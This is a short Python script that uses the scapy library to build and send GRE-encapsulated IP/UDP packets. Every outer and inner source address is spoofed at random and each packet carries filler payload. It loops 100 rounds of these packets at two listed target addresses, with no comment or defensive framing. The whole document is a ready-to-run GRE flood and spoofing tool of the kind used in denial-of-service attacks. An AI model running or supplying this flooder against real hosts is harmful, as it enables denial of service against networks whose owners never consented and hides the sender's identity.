from scapy.all import IP, send, GRE, UDP, Raw
import random

def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64):
    ip = IP()
    ip.src = source_ip
    ip.dst = dest_ip
    ip.ttl = ttl
    
    gre = GRE(proto=gre_protocol)

    inner_ip = IP()
    inner_ip.src = random_ip()
    inner_ip.dst = dest_ip
    inner_ip.ttl = ttl

    udp = UDP()
    udp.sport = random.randint(1024, 65535)
    udp.dport = random.randint(1024, 65535)
    udp.len = data_len + len(udp)

    payload = Raw(load="X" * data_len)

    packet = ip/gre/inner_ip/udp/payload

    return packet

def send_gre_ip_packets(target_ips, num_packets=10):
    for i in range(num_packets):
        for target_ip in target_ips:
            source_ip = random_ip()
            packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
            send(packet)

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

target_ips = ["192.168.1.1", "192.168.1.2"]
send_gre_ip_packets(target_ips, num_packets=100)